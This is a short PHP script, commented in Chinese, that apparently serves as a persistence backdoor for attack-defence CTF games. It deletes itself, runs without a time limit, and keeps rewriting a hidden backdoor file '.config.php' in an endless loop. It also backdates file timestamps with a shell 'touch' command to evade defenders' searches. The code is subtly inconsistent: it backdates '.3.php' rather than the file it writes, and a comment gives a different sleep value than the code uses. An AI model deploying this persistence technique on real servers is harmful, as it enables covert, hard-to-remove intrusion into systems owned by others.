<?php
    ignore_user_abort(true); //设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行
    set_time_limit(0); //设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
    unlink(__FILE__); //删除文件本身，以起到隐蔽自身的作用
    $file = '.config.php';
    $code = '<?php echo "sb" ?>'; //进行校验是为了防止自家木马被其他人利用
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(500); //while循环中每隔usleep(5000)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中会有队伍使用find命令查看文件的修改时间
    }
?>